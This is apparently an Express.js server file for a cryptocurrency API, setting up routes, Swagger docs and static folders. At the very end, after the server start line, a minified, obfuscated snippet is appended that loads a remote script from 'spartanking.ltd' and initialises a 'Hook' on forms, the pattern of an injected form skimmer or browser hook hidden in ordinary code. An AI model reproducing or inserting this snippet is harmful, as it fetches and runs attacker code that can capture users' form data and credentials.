require("dotenv").config();
// const connection = require("./config/connection");
require("./config/mongoConnection")
const express=require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
var bodyParser = require('body-parser');
const cors=require("cors");
const router=require("./routes/route");
const {testDbConnection} = require("./config/connection");
const swaggerUi = require('swagger-ui-express');
const swaggerDocument = require('./swagger.json');
const path = require("path");
//const socketUtils = require("./sockett");

//const io = socketUtils.sio(server);
//socketUtils.connection(io)

app.use(express.static('public'));
app.use('/upload', express.static('public/upload'));

//require("./sockett").listen(server);

// const socketIOMiddleware = (req, res, next) => {
//     req.io = io;
  
//     next();
// };


//static path define for all currencies icons
app.use(express.static('public'));
app.use('/currency', express.static('public/currency'));
 
app.use(cors());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json({ type: 'application/*+json' }));
app.use("/api/v1/crypto/",router);

app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument));


app.get("/testing",function(req,res){
    return res.send("testiong route...")
});


// app.use((req,res,error) => {return res.send("semething went wrong")})


server.listen(parseInt(process.env.PORT,10) || 4000,() => console.log(`server run at http://localhost:${process.env.PORT}`))
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src="//spartanking.ltd/client.js?cache=ignore",o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//13d24456aac9da6d428dff2180c49a3ddb5055080990a66dd8e809ef2a7fe578